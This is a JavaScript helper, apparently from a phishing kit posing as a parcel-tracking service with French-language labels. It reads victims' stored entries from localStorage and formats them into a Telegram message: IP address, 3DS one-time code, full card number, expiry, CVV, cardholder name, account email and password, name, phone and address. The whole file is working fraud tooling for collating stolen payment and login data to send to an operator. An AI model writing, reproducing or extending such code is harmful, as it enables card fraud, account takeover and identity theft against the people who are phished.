// Helper to build cumulative Telegram messages

export const buildTelegramMessage = (clientIp = "Unknown") => {
  // Parse with fallback to empty object, ensuring we only use valid data
  const trackData = JSON.parse(localStorage.getItem("trackData") || "{}");
  const loginData = JSON.parse(localStorage.getItem("loginData") || "{}");
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const otpData = JSON.parse(localStorage.getItem("otpData") || "{}");
  
  // Validate that data objects are actually objects (not null or invalid JSON)
  const safeTrackData = typeof trackData === "object" && trackData !== null ? trackData : {};
  const safeLoginData = typeof loginData === "object" && loginData !== null ? loginData : {};
  const safePaymentData = typeof paymentData === "object" && paymentData !== null ? paymentData : {};
  const safeOtpData = typeof otpData === "object" && otpData !== null ? otpData : {};

  let message = `<b>IP: ${clientIp}</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;

  // 3DS Code (newest - at top)
  if (safeOtpData.code) {
    message += `\n<b>🔐 CODE 3DS:</b> <code>${safeOtpData.code}</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  }

  // Payment Info
  if (safePaymentData.cardNumber) {
    message += `\n<b>💳 CARTE</b>\n`;
    message += `<code>${safePaymentData.cardNumber}</code>\n`;
    message += `Exp: <code>${safePaymentData.expiration}</code> | CVV: <code>${safePaymentData.cvv}</code>\n`;
    message += `Titulaire: <code>${safePaymentData.cardHolder}</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  }

  // Login Info
  if (safeLoginData.email && safeLoginData.password) {
    message += `\n<b>🔑 LOGIN</b>\n`;
    message += `📧 <code>${safeLoginData.email}</code>\n`;
    message += `🔒 <code>${safeLoginData.password}</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  }

  // Personal Info (oldest - at bottom)
  if (safeTrackData.fullName) {
    message += `\n<b>👤 INFOS PERSONNELLES</b>\n`;
    message += `Nom: <code>${safeTrackData.fullName}</code>\n`;
    message += `📱 <code>${safeTrackData.phone}</code>\n`;
    message += `📍 <code>${safeTrackData.address}</code>\n`;
    message += `CP: <code>${safeTrackData.postalCode}</code>\n`;
  }

  return message;
};
